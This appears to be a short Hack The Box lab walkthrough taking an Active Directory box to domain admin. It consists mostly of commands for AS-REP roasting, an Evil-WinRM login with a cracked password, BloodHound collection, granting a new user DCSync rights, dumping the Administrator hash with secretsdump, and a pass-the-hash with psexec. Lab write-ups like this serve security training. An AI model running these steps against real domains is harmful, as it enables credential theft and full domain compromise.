@@ -1,0 +1,77 @@
+[-] No shares on SMB
+
+[-] Nothing on HTTP
+
+[+] Anonymous login on RPC is allowed! Scanning enum4linux output...
+
+Domain: HTB
+
+user:[Administrator] rid:[0x1f4] group: 'Domain Users'
+user:[krbtgt] rid:[0x1f6] group: 'Domain Users'
+user:[sebastien] rid:[0x479] group: 'Domain Users'
+user:[lucinda] rid:[0x47a] group: 'Domain Users'
+user:[svc-alfresco] rid:[0x47b] group: 'Domain Users'
+user:[andy] rid:[0x47e] group: 'Domain Users'
+user:[mark] rid:[0x47f] group: 'Domain Users'
+user:[santi] rid:[0x480] group: 'Domain Users'
+
+[+] Kerberos is there. Time to roast it.
+
+Note: Typically that requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.
+
+root@parrot# users=("Administrator" "krbtgt" "sebastien" "lucinda" "svc-alfresco" "andy" "mark" "santi")
+root@parrot# for user in ${users[@]}; do python3 `locate GetNPUsers.py` -no-pass -dc-ip 10.10.10.161 HTB/$user | grep -v Impacket; done
+
+[+] Got hash for svc-alfresco!
+
+[+] Cracked hash using JTR!
+
+[?] There are no SMB shares, no SSH, no web application. Maybe, WinRM?
+
+root@parrot# evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice -s /media/psf/Home/Downloads/results/10.10.10.161/exploit/ps-scripts
+
+[+] Evil-WinRM worked! We're in.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> SharpHound.ps1
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> PowerView.ps1
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-BloodHound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20200815011021_BloodHound.zip
+
+[*] Using BloodHound to build a route to Administrator. 
+
+limitedeternity$ JAVA_HOME=$(/usr/libexec/java_home -v 11) neo4j start
+
+svc-alfresco -- [MemberOf] 
+--> Service Accounts -- [MemberOf] 
+--> Priveleged IT Accounts -- [MemberOf] 
+--> Account Operators (can create users) -- [GenericAll]
+--> Exchange Windows Permissions (full control) -- [WriteDacl]
+--> htb.local -- [Contains]
+--> Administrator
+
+============
+
+[+] Commands:
+
+net user harm0ni password123 /add /domain
+net group "Exchange Windows Permissions" /add harm0ni
+$SecPassword = ConvertTo-SecureString 'password123' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb\harm0ni', $SecPassword)
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity harm0ni -Rights DCSync
+
+[+] Dumping secrets:
+
+root@parrot# impacket-secretsdump 'htb.local/harm0ni:password123@10.10.10.161' -just-dc -just-dc-user Administrator
+
+[+] Grabbed NTDS.DIT secret!
+
+Note: The Ntds.dit is a database that stores Active Directory data, including information about user objects, groups and group membership. It includes the password hashes for all users in the domain.
+By extracting these hashes, it is possible to use tools such as Mimikatz to perform pass-the-hash attacks, or tools like Hashcat to crack these passwords. 
+
+[+] Trying Pass-The-Hash:
+
+root@parrot# python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Administrator@10.10.10.161
+
+[+] Success.
+
+
